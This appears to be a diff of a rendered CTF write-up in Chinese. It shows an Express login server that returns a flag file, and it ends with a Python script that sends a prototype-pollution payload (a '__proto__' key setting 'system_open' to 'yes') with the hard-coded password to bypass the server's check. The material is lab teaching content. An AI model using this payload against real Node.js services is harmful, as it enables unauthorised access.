-<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
-    <span class="kr">const</span> <span class="nx">login_html</span> <span class="o">=</span> <span class="nx">readFile</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s2">&#34;login.html&#34;</span><span class="p">))</span>
-    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="nx">login_html</span><span class="p">)</span>
-<span class="p">})</span>
-
-<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express_static</span><span class="p">(</span><span class="s2">&#34;./&#34;</span><span class="p">))</span>
-
-<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
-    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`server listening on </span><span class="si">${</span><span class="nx">port</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
-<span class="p">})</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">express_static</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express-static&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;path&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="mi">9000</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nx">json</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nx">urlencoded</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">extended</span><span class="o">:</span> <span class="kc">true</span>
+</span></span><span class="line"><span class="cl"><span class="p">}))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">info</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">body</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">validationResult</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express-validator&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">middlewares</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">body</span><span class="p">(</span><span class="s1">&#39;*&#39;</span><span class="p">).</span><span class="nx">trim</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">body</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">).</span><span class="nx">isLength</span><span class="p">({</span> <span class="nx">min</span><span class="o">:</span> <span class="mi">6</span> <span class="p">}),</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">middlewares</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">readFile</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">filename</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">data</span> <span class="o">=</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="nx">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nx">data</span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s2">&#34;/login&#34;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">errors</span> <span class="o">=</span> <span class="nx">validationResult</span><span class="p">(</span><span class="nx">req</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">errors</span><span class="p">.</span><span class="nx">isEmpty</span><span class="p">())</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">errors</span><span class="o">:</span> <span class="nx">errors</span><span class="p">.</span><span class="nx">array</span><span class="p">()</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">password</span> <span class="o">==</span> <span class="s2">&#34;D0g3_Yes!!!&#34;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">info</span><span class="p">.</span><span class="nx">system_open</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">info</span><span class="p">.</span><span class="nx">system_open</span> <span class="o">==</span> <span class="s2">&#34;yes&#34;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="kr">const</span> <span class="nx">flag</span> <span class="o">=</span> <span class="nx">readFile</span><span class="p">(</span><span class="s2">&#34;/flag&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="nx">flag</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;The login is successful, but the system is under test and not open...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;Login Fail, Password Wrong!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">login_html</span> <span class="o">=</span> <span class="nx">readFile</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s2">&#34;login.html&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="nx">login_html</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express_static</span><span class="p">(</span><span class="s2">&#34;./&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`server listening on </span><span class="si">${</span><span class="nx">port</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>定位回显flag的代码</p>
 <div class="highlight"><div class="chroma">
@@ -608,18 +608,18 @@
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">password</span> <span class="o">==</span> <span class="s2">&#34;D0g3_Yes!!!&#34;</span><span class="p">){</span>
-    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">info</span><span class="p">.</span><span class="nx">system_open</span><span class="p">)</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nx">info</span><span class="p">.</span><span class="nx">system_open</span> <span class="o">==</span> <span class="s2">&#34;yes&#34;</span><span class="p">){</span>
-        <span class="kr">const</span> <span class="nx">flag</span> <span class="o">=</span> <span class="nx">readFile</span><span class="p">(</span><span class="s2">&#34;/flag&#34;</span><span class="p">)</span>
-        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="nx">flag</span><span class="p">)</span>
-    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
-        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;The login is successful, but the system is under test and not open...&#34;</span><span class="p">)</span>
-    <span class="p">}</span>
-<span class="p">}</span><span class="k">else</span><span class="p">{</span>
-    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;Login Fail, Password Wrong!&#34;</span><span class="p">)</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">password</span> <span class="o">==</span> <span class="s2">&#34;D0g3_Yes!!!&#34;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">info</span><span class="p">.</span><span class="nx">system_open</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">info</span><span class="p">.</span><span class="nx">system_open</span> <span class="o">==</span> <span class="s2">&#34;yes&#34;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">flag</span> <span class="o">=</span> <span class="nx">readFile</span><span class="p">(</span><span class="s2">&#34;/flag&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="nx">flag</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;The login is successful, but the system is under test and not open...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;Login Fail, Password Wrong!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>回显flag条件：</p>
 <ul>
@@ -640,15 +640,15 @@
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span> <span class="k">as</span> <span class="nn">req</span>
-<span class="n">target</span> <span class="o">=</span> <span class="s1">&#39;http://IP/login&#39;</span>
-<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
-    <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s2">&#34;D0g3_Yes!!!&#34;</span><span class="p">,</span>
-    <span class="s2">&#34;a&#34;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&#34;__proto__&#34;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&#34;system_open&#34;</span><span class="p">:</span> <span class="s2">&#34;yes&#34;</span><span class="p">}},</span> <span class="s2">&#34;a</span><span class="se">\&#34;</span><span class="s2">].__proto__[</span><span class="se">\&#34;</span><span class="s2">system_open&#34;</span><span class="p">:</span> <span class="s2">&#34;no&#34;</span>
-<span class="p">}</span>
-<span class="n">res</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">target</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span> <span class="k">as</span> <span class="nn">req</span>
+</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="s1">&#39;http://IP/login&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s2">&#34;D0g3_Yes!!!&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;a&#34;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&#34;__proto__&#34;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&#34;system_open&#34;</span><span class="p">:</span> <span class="s2">&#34;yes&#34;</span><span class="p">}},</span> <span class="s2">&#34;a</span><span class="se">\&#34;</span><span class="s2">].__proto__[</span><span class="se">\&#34;</span><span class="s2">system_open&#34;</span><span class="p">:</span> <span class="s2">&#34;no&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">res</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">target</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div>
             </div>
